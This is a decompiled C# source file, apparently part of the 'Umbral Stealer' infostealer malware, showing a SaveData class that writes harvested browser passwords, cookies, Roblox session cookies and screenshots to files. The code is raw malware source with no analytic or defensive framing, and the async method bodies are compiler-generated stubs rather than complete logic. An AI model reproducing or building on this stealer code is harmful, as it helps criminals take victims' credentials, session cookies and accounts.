﻿using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;

namespace SHARP
{
	// Token: 0x02000067 RID: 103
	internal static class SaveData
	{
		// Token: 0x06000238 RID: 568 RVA: 0x0000E1B8 File Offset: 0x0000C3B8
		internal static Task SaveToFile(PasswordFormat[] passwords, string filepath)
		{
			SaveData.<SaveToFile>d__2 <SaveToFile>d__;
			<SaveToFile>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<SaveToFile>d__.passwords = passwords;
			<SaveToFile>d__.filepath = filepath;
			<SaveToFile>d__.<>1__state = -1;
			<SaveToFile>d__.<>t__builder.Start<SaveData.<SaveToFile>d__2>(ref <SaveToFile>d__);
			return <SaveToFile>d__.<>t__builder.Task;
		}

		// Token: 0x06000239 RID: 569 RVA: 0x0000E204 File Offset: 0x0000C404
		internal static Task SaveToFile(CookieFormat[] cookies, string filepath)
		{
			SaveData.<SaveToFile>d__3 <SaveToFile>d__;
			<SaveToFile>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<SaveToFile>d__.cookies = cookies;
			<SaveToFile>d__.filepath = filepath;
			<SaveToFile>d__.<>1__state = -1;
			<SaveToFile>d__.<>t__builder.Start<SaveData.<SaveToFile>d__3>(ref <SaveToFile>d__);
			return <SaveToFile>d__.<>t__builder.Task;
		}

		// Token: 0x0600023A RID: 570 RVA: 0x0000E250 File Offset: 0x0000C450
		internal static Task SaveToFile(string[] robloxCookies, string filepath)
		{
			SaveData.<SaveToFile>d__4 <SaveToFile>d__;
			<SaveToFile>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<SaveToFile>d__.robloxCookies = robloxCookies;
			<SaveToFile>d__.filepath = filepath;
			<SaveToFile>d__.<>1__state = -1;
			<SaveToFile>d__.<>t__builder.Start<SaveData.<SaveToFile>d__4>(ref <SaveToFile>d__);
			return <SaveToFile>d__.<>t__builder.Task;
		}

		// Token: 0x0600023B RID: 571 RVA: 0x0000E29C File Offset: 0x0000C49C
		internal static void SaveToFile(Bitmap[] screenshots, string folderPath)
		{
			for (int i = 0; i < screenshots.Length; i++)
			{
				try
				{
					string filename = Path.Combine(folderPath, "Display" + ((screenshots.Length > 1) ? string.Format("-{0}", i + 1) : string.Empty) + ".png");
					screenshots[i].Save(filename, ImageFormat.Png);
				}
				catch (Exception value)
				{
					Console.WriteLine(value);
				}
			}
		}

		// Token: 0x0600023C RID: 572 RVA: 0x0000E314 File Offset: 0x0000C514
		internal static void SaveToFile(Dictionary<string, Bitmap> images, string folderPath)
		{
			foreach (KeyValuePair<string, Bitmap> keyValuePair in images)
			{
				try
				{
					string filename = Path.Combine(folderPath, keyValuePair.Key + ".png");
					keyValuePair.Value.Save(filename, ImageFormat.Png);
				}
				catch (Exception value)
				{
					Console.WriteLine(value);
				}
			}
		}

		// Token: 0x04000136 RID: 310
		private static readonly string Delimeter = "==================Umbral Stealer==================";
	}
}
